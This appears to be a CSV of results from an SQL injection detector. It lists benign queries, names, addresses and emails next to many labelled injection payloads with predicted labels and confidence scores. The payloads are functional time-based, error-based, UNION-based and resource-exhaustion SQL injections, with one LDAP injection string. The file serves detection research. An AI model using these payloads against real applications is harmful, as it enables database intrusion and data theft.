text,true_label,predicted_label,confidence_sql_injection
select * from easily where led = 'field',0,0,0.0
select count ( possibly )  from rose,0,0,0.0
"select sleep  (  5  )   and ""irxg""  =  ""irxg",1,1,1.0
"calle artigako haritza, s/n 8?d",0,0,0.0
select these ( s )  from clear select strange ( s ) ,0,0,0.0
select column_name from table_name where column_name in  ( ,0,0,0.01
select high ( s )  from snake union all,0,0,0.0
"1""   )    )    as swwb where 4244  =  4244",1,1,1.0
87811832v,0,0,0.004468253314358248
select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,1,1,1.0
"1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018",1,1,1.0
"  select making as hang, class as [found]  from claws",0,0,0.0
"1"" rlike sleep  (  5  )  #",1,1,1.0
hermida fiordalizzi,0,0,0.004468253314358248
gonzalvo gorriti,0,0,0.004468253314358248
arima@hormigon-impreso.nu,0,0,0.006527024015406931
select * from frog fetch first 50 percent rows only,0,0,0.0
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from perfect,0,0,0.0
maximiliano,0,0,0.004468253314358248
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1,1,1.0
 (  select   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  select 8130 from information_schema.character_sets  )   end   )    ) ,1,1,0.99
tennant4,0,0,0.004468253314358248
antoine,0,0,0.004468253314358248
74132716j,0,0,0.004468253314358248
select * from design,0,0,0.0
"  select include,corner,first from thin left join orders on tongue.freshid =  young.class order by everywhere.flew",0,0,0.0
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",1,1,1.0
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,1.0
select * from  ( select seen from see ) ,0,0,0.0
select interest from men,0,0,0.0
"pl. quintero baez, 137",0,0,0.004468253314358248
select option_value from wp_options where option_name  =  'sm_organize_media' limit 1,0,0,0.0
select * from meant fetch first 50 percent rows only,0,0,0.0
1' and 1661  =  1244 and 'dcha'  =  'dcha,1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9053 )  order by meta_id asc",0,0,0.0
"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",1,1,1.0
select * from most order by people,0,0,0.0
6.52922e+15,0,0,0.0
"   select becoming, atomic, researchfrom carbon where modern  is not null",0,0,0.0
1'   )    )    as pqbq where 1865  =  1865,1,1,1.0
select * from corn where offer = 'atom' fetch first 3 rows only,0,0,0.0
select glass ( s )  from keep union,0,0,0.0
select * from color where rush  between 10 and 20,0,0,0.0
"  select * from us where rather in  ( 'basic', 'similar', 'certainly' )  ",0,0,0.0
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,1,1.0
"-8684 union all select 9519,9519,9519,9519--",1,1,1.0
"select * from generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1,1,1.0
"insert into aboard  ( smallest, large, somehow )  values  ( 'ready', 'maybe', 'element' )  ",0,0,0.0
select amount from equipment union select sides from whose order by advice,0,0,0.0
" select sleep  (  5  )   and    (    (   ""rthl"" like ""rthl",1,1,1.0
c/ guillen santacilla 94,0,0,0.0
huesca,0,0,0.004468253314358248
5215,0,0,0.004468253314358248
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1,1,1.0
"1'  )   as nmzp where 3794  =  3794 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"insert into thirty ( stems, prepare, sure, lovely, surface, food )  values  ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )  ",0,0,0.0
select avg ( habit ) from ago select sum ( manner ) ,0,0,0.0
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",1,1,1.0
33560,0,0,0.004468253314358248
neira umbert,0,0,0.004468253314358248
" select * from users where id  =  1 +\+. union select null,@@version -- 1",1,1,1.0
select * from central fetch first 50 percent rows only,0,0,0.0
"  select knifeid as id, milk as string from even",0,0,0.0
 update breakfast set science = 'strong'where finish = 'main',0,0,0.0
"1'  )   union all select null,null#",1,1,1.0
select * from fastened where all not like '[driving]%',0,0,0.01
" select * from wire order by receive, knife",0,0,0.0
select count ( primitive ) from especially,0,0,0.0
select * from national where with  between 10 and 20,0,0,0.0
"iif  (  7953  =  3021,1,1/0  )  ",1,1,1.0
select count ( distinct share )  from warm,0,0,0.0
barreras de la bandera,0,0,0.0
select third ( s )  from about full outer join,0,0,0.0
select period ( s )  from thought select even from busy,0,0,0.0
 update serve set official = 'colony'where labor = 'dark',0,0,0.0
28011073v,0,0,0.004468253314358248
"  select dropid as id, four as importance from low",0,0,0.0
 or 0  =  0 --,1,1,0.92
select top 3 * from coal,0,0,0.0
"  select * from position where broke in  ( 'valuable', 'dinner', 'record' )  ",0,0,0.0
"   select employees.wide, count ( orders.alreadyid )  as spitefrom    ( ordersinner join away on orders.wireid  =  employees.contrastid ) ",0,0,0.0
winstanley@waterflyesp.hn,0,0,0.004468253314358248
"1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  8403,8899   )    )   +'",1,1,1.0
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,1,1,1.0
1'||  (  select 'cclo' from dual where 6823  =  6823 and 9198  =  9198--,1,1,1.0
"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",1,1,1.0
select baby ( s )  from floating left join,0,0,0.0
"  select chief as half, sitting as [bound]  from average",0,0,0.0
illano,0,0,0.004468253314358248
8.58629e+14,0,0,0.0
select * from forth where missing = 'outer',0,0,0.0
"1%""   )    )    and   (  7817  =  4371  )  *4371 and    (    (   ""%""  =  """,1,1,1.0
aguilera troule,0,0,0.004468253314358248
yu-hung,0,0,0.006527024015406931
select * from powerful where melted between 'dinner' and 'topic',0,0,0.0
"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",1,1,1.0
"1%"" union all select null,null,null,null,null,null,null--",1,1,1.0
select * from silent where society = 'failed' fetch first 3 rows only,0,0,0.0
select * from honor where moment = 'wave' fetch first 3 rows only,0,0,0.0
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,1,1.0
"  select shutid as id, canal as pile from bit",0,0,0.0
dagma,0,0,0.004468253314358248
select min ( flat )  as lower from railroad,0,0,0.0
select * from women where price not between 10 and 20,0,0,0.0
select floor ( 25.75 ) ;,0,0,0.0
select * from baby where smaller = 'treated' fetch first 3 rows only,0,0,0.0
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1,1,1.0
select top 3 * from lift where sound = 'shoulder' select * from fur,0,0,0.0
1 order by 1--,1,1,0.98
dowson@sehimaco.eg,0,0,0.004468253314358248
olmeda de la cuesta,0,0,0.0
"-1204'   )    )    union all select 3585,3585--",1,1,1.0
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
belva,0,0,0.004468253314358248
select * from goes  where any not like '[crew]%',0,0,0.0
1'   )    )    as xqam where 6750  =  6750,1,1,1.0
select * from stepped where broken between '1996-07-01' and '1996-07-31',0,0,0.0
nataln,0,0,0.004468253314358248
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1,1,0.99
57,0,0,0.004468253314358248
"   select count ( especially ) , crew from soldier by height",0,0,0.0
"  select joy,hunter,plastic from mission left join orders on child.finallyid =  corner.empty order by library.after",0,0,0.0
"1""   )    )    as svim where 4924  =  4924 and 7932  =  5870",1,1,1.0
select * from products where productname not between 'carnarvon tigers' and 'mozzarella di giovanni' order by productname;,0,0,0.01
-6145 or   (  8459  =  8459  )  *4906-- yklv,1,1,1.0
couri-manahan@copiar.com.fm,0,0,0.02
"1 union all select null,null,null,null,null,null#",1,1,1.0
1  )   where 2543  =  2543,1,1,1.0
"1'  )   and elt  (  1407  =  6365,6365  )   and   (  'zckl'  =  'zckl",1,1,1.0
"   select employees.fence, count ( orders.volumeid )  as chamberfrom    ( ordersinner join sister on orders.layersid  =  employees.cloudid ) ",0,0,0.0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1,1,1.0
foto3rfico,0,0,0.004468253314358248
"  update wash set clothing =  'guess', city =  'monkey' where nuts =  coming",0,0,0.0
78248698f,0,0,0.004468253314358248
"select count  (  *  )   from generate_series  (  1,5000000  )  --",1,1,0.97
select pg_sleep  (  5  )   and '%'  =  ',1,1,0.98
"  select * from outside where nervous in  ( 'aware', 'cut', 'all' )  ",0,0,0.02
select distinct force from lonely,0,0,0.0
"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752",1,1,1.0
"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
ostapchuk casal,0,0,0.004468253314358248
select count ( distinct cost )  from underline,0,0,0.0
17536,0,0,0.004468253314358248
pred6.finir,0,0,0.004468253314358248
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,1,1.0
select standard from shoot union all select flies from saved order by children,0,0,0.0
shedd,0,0,0.004468253314358248
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,1,1.0
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,1,1,1.0
"1""   )    )    as xcyo where 2929  =  2929",1,1,1.0
h46a00o,0,0,0.004468253314358248
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",1,1,1.0
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1,1.0
robledo,0,0,0.004468253314358248
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,1.0
cuz,0,0,0.004468253314358248
select volume ( s ) from girl inner join,0,0,0.0
"calle profesor angel lacalle, s/n,",0,0,0.0
"1'   )    )    as namw where 1740  =  1740 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
select * from taken where    not yesterday = 'saddle',0,0,0.0
maryrose,0,0,0.004468253314358248
select recall ( s )  from near select yard ( s ) ,0,0,0.0
2.79635e+15,0,0,0.0
"select t.*, tt.*, tr.object_id from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id inner join wp_term_relationships as tr on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'support_cat' )  and tr.object_id in  ( 347681, 262330, 292419, 262334 )  order by t.name asc",0,0,0.05
select * from brush fetch first 50 percent rows only,0,0,0.0
select avg ( price ) from consist,0,0,0.0
from  ( select distinct roll from independent ) ,0,0,0.0
select * from  ( select machine from combine ) ,0,0,0.0
select * from bus where question not like '[having]%',0,0,0.0
select count ( distinct community )  from journey,0,0,0.0
-6233'  )   where 9820  =  9820 or 3038  =  3038,1,1,1.0
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",1,1,1.0
select option_value from wp_options where option_name  =  '_transient_timeout_wp_stateless_google_sdk_conflict' limit 1,0,0,0.0
select flew ( s )  from only union,0,0,0.0
select * from rate where same between 'two' and 'congress',0,0,0.0
"c/ amador de los rios, 131, 1?g",0,0,0.04
"  select * from glass where life in  ( 'fall', 'slip', 'heat' )  ",0,0,0.0
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1,1,0.99
select avg ( lion ) from this,0,0,0.0
select * from sudden  where industrial = bigger,0,0,0.0
"  select orders.expectrid, employees.about, employees.zipper from ordersright join employees on orders.employeeid  =  employees.determineid order by orders.unitid",0,0,0.0
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 262335 )  order by meta_id asc",0,0,0.0
-5356'  )   or 9323  =  9323#,1,1,1.0
1  )   where 4780  =  4780,1,1,1.0
"1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,1,1.0
select * from vowel where test between 'additional' and 'won',0,0,0.0
8110,0,0,0.004468253314358248
" select * from military order by lower, courage",0,0,0.0
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,0.99
4ntra6a,0,0,0.004468253314358248
"1'||  (  select 'djoe' from dual where 8063  =  8063   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",1,1,1.0
select case when 1802  =  7063 then 1 else null end--,1,1,1.0
pettinge,0,0,0.004468253314358248
select top 3 * from stage,0,0,0.0
select * from machinery,0,0,0.0
1'+  (  select 'mxlb' where 4900  =  4900,1,1,1.0
select avg ( population ) from thread select sum ( at ) ,0,0,0.0
leandro,0,0,0.004468253314358248
1'+  (  select ntym where 4750  =  4750,1,1,1.0
moskuna@sitcpla.ye,0,0,0.004468253314358248
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'qbdm'  =  'qbdm",1,1,1.0
select * from tail where herd = 'sun'  and  ( film = 'entirely' or become = 'sport' ) ,0,0,0.0
oskorep,0,0,0.004468253314358248
aimarsen@enla.gi,0,0,0.004468253314358248
32,0,0,0.004468253314358248
"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
select belt,0,0,0.03250505488953901
"1'+  (  select 'cstd' where 9326  =  9326 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,1,1.0
torrecilla lafuente,0,0,0.004468253314358248
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@version -- 1'",1,1,0.99
guindo vive,0,0,0.004468253314358248
duchement tenza,0,0,0.004468253314358248
6i4t562e7a,0,0,0.004468253314358248
"1""  )   as hfgk where 1100  =  1100 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select count ( whale )  from chamber,0,0,0.0
bu7c2pi,0,0,0.004468253314358248
burgs campa,0,0,0.004468253314358248
select any ( s )  from close union all,0,0,0.0
select team from pack,0,0,0.0
1'+  (  select hvsb where 3666  =  3666,1,1,1.0
-4713'   )    )     )   or 4567  =  1287,1,1,1.0
select count ( top ) from model,0,0,0.0
select * from bat fetch first 50 percent rows onlyselect top 3 * from telephone,0,0,0.0
select * from hidden fetch first 3 rows only select top 50 percent * from fifth,0,0,0.0
"1"" where 6501  =  6501",1,1,1.0
select top 50 percent * from area select * from wise fetch first 50 percent rows onlyselect top 3 * from throat,0,0,0.0
select count ( distinct quietly )  from college,0,0,0.0
select top 50 percent * from ear select * from fog fetch first 50 percent rows onlyselect top 3 * from tribe,0,0,0.0
select top 3 * from constantly select * from outer 3select * from consider,0,0,0.0
select wp_posts.* from wp_posts where 1 = 1 and wp_posts.post_parent  =  367564 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish' or wp_posts.post_status  =  'trash'  )  )   order by wp_posts.menu_order asc,0,0,0.08
from  ( select distinct low from wish ) ,0,0,0.0
" select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1,1,1.0
"-9003""   )    )    union all select 9721,9721--",1,1,1.0
select * from cream 3 select * from cloth,0,0,0.0
stadler_munks@chevrolet-volt.at,0,0,0.010209845608260035
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1,1,1.0
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'yiem'  =  'yiem",1,1,1.0
saturin-fabre0@cienciapolicial.int,0,0,0.09024765303088228
select * from belong where tight = 'bow' fetch first 3 rows only,0,0,0.0
"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",1,1,1.0
select top 50 percent * from oxygen,0,0,0.0
47965007w,0,0,0.004468253314358248
"  select * from rather where anything in  ( 'doctor', 'examine', 'well' )  ",0,0,0.0
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""ijag",1,1,1.0
79564193v,0,0,0.004468253314358248
elois,0,0,0.004468253314358248
dans,0,0,0.004468253314358248
select * from share where curious between 'better' and 'office',0,0,0.0
select * from spin where fence not like '[master]%',0,0,0.0
mohar@ropadegolf.gg,0,0,0.004468253314358248
select * from chamber where brave  between 10 and 20,0,0,0.0
"-1917""  )   or 8571  =  8571--",1,1,1.0
"  select * from body where told in  ( 'moving', 'rest', 'since' )  ",0,0,0.0
select fort ( s )  from main left join,0,0,0.0
levert,0,0,0.004468253314358248
select * from balance where return = 'atomic'  or neck = 'plant',0,0,0.0
select * from arrangement where return between certain09/01/1996four and chart15/31/1996party,0,0,0.0
select * from rain fetch first 50 percent rows only,0,0,0.0
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select * from farm where grass = 'material' fetch first 3 rows only,0,0,0.0
select fox from first union select breakfast from mouse order by silk,0,0,0.0
select * from cool where ready = 'eye'  or regular = 'alive',0,0,0.0
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1,1.0
"  select except,he,extra from child left join orders on market.classid =  palace.dead order by course.leader",0,0,0.0
or ''  =  ',1,1,1.0
afijacin,0,0,0.004468253314358248
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
perene,0,0,0.004468253314358248
5164,0,0,0.004468253314358248
hennon,0,0,0.004468253314358248
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) ,1,1,1.0
select torn ( s )  from pile union,0,0,0.0
"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
"  select announced,noon from beginning where brown = 'cave' union select foot, quiet from rabbit",0,0,0.0
"1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1,1,1.0
"insert into motor ( gasoline, something, single, because, below, announced )  values  ( 'gather', 'produce'. fight', 'chart', 'plate', 'meat', 'nose' )  ",0,0,0.0
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1,1,1.0
select * from machine  where death not like '[tool]%',0,0,0.0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from write where silk = 'remain'  and city = 'wait',0,0,0.0
select correctly ( s ) from wave inner join,0,0,0.0
select top 3 * from wild where laid = 'same' select * from provide,0,0,0.0
select curtime (  )  + 1;,0,0,0.0
muro de aguas,0,0,0.0
select * from feed where date between direction09/01/1996breathe and grain15/31/1996jar,0,0,0.0
select dayofyear ( curdate (   )  )  ;,0,0,0.0
select * from dozen where verb not like 'clothing%',0,0,0.0
1'||  (  select 'yezk' where 2097  =  2097,1,1,1.0
select * from scared where scared like '%our%',0,0,0.0
roca,0,0,0.004468253314358248
1   )    )    and 9198  =  9198--,1,1,1.0
lorain-ligero@mareventsprotocolosocial.tn,0,0,0.006527024015406931
" select column_name ( s )  from serve,fill",0,0,0.0
select wind ( s )  from charge select correctly ( s ) ,0,0,0.0
select * from danger order by wealth,0,0,0.0
"   select employees.house, count ( orders.picturedid )  as nationalfrom    ( ordersinner join series on orders.deeplyid  =  employees.positionid ) ",0,0,0.0
select avg ( wrote )  from straw  select sum ( love ) ,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""%""  =  """,1,1,1.0
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
select told ( s )  from bring full outer join,0,0,0.0
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'qdhz'  =  'qdhz",1,1,1.0
fernn caballero,0,0,0.004468253314358248
select * from wide fetch first 50 percent rows only,0,0,0.0
select include ( s )  from egg full outer join,0,0,0.0
coch soto,0,0,0.004468253314358248
69346006v,0,0,0.004468253314358248
c/ grabador david roberts 154 1-h,0,0,0.04
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
select * from customers order by customername;,0,0,0.0
conmi5u52,0,0,0.004468253314358248
select count ( * )  as year,0,0,0.0
"  select   cast ( ""2017-08-29"" as date ) ;",0,0,0.04
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,1.0
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,1,1,0.99
"  select wrong,arrangement,danger from chest left join orders on once.mysteriousid =  manufacturing.expression order by top.lake",0,0,0.0
bockaj,0,0,0.004468253314358248
39152269j,0,0,0.004468253314358248
2563,0,0,0.004468253314358248
"c/ juan luis peralta, 49 13-f",0,0,0.0
delete from bush where deal = 'inside',0,0,0.0
nonaspe,0,0,0.004468253314358248
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",1,1,1.0
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1,0.99
divinizacin,0,0,0.004468253314358248
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1,1,1.0
"1' in boolean mode  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
select * from production fetch first 50 percent rows only,0,0,0.0
"insert into balance  ( meant, gravity, daily )  values  ( 'let', 'soldier', 'chief' )  ",0,0,0.0
virge,0,0,0.004468253314358248
"1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#",1,1,1.0
"-1630' union all select 1971,1971--",1,1,1.0
select * from two where library = 'keep'  or ants = 'closely',0,0,0.0
select avg ( perfectly ) from band,0,0,0.0
select * from power where thick = 'accept'  and city = 'native',0,0,0.0
"grupo fuensanta 197, 12?a",0,0,0.07318018131493495
select * from either fetch first 50 percent rows only,0,0,0.0
"insert into grade ( chapter, do, graph, exactly, steady, news )  values  ( 'motor', 'cannot'. regular', 'edge', 'burst', 'flag', 'never' )  ",0,0,0.0
select * from wore where weak = 'gas'  or additional = 'wherever',0,0,0.0
"1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
select top 50 percent * from diameter select * from real fetch first 50 percent rows onlyselect top 3 * from ready,0,0,0.0
select * from interior where themselves = 'compare'  or verb = 'rain',0,0,0.0
select avg ( plus )  from dirt  select sum ( dropped ) ,0,0,0.0
thuswald,0,0,0.004468253314358248
select * from powder where not brown = 'not'  and not pond = 'soil',0,0,0.0
%2a%28%7c%28mail%3d%2a%29%29,1,1,0.9800939470890968
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",1,1,1.0
